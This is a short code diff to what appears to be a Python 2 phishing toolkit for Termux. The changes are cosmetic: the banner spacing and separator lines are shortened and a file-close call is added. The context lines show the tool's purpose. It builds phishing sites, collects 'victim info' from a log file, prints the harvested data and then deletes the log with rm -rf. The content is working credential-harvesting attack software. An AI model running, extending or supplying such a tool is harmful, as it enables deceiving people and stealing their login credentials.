@@ -67,8 +67,6 @@ def loadModule(module):
  .'       "-.,' / 
 ( AnonUD4Y  _.  < 
  `=.____.="  `._\\
-
-
  [{1}*{0}]{1} %s module loaded. Building site...{0}'''.format(CYAN, END) % module
 
 def runPhishing(social, option2):
@@ -138,10 +136,12 @@ def waitCreds():
         with open('ServerTermux/www/iplog.txt') as creds:
             lines = creds.read().rstrip()
         if len(lines) != 0: 
-            print '======================================================================'.format(RED, END)
+            print '================================================='.format(RED, END)
             print ' {0}[ VICTIM INFO FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
             system('rm -rf ServerTermux/www/iplog.txt && touch ServerTermux/www/iplog.txt')
-            print '======================================================================'.format(RED, END)
+            print '================================================='.format(RED, END)
+
+        creds.close()
 
 def runPEnv():
     system('clear')
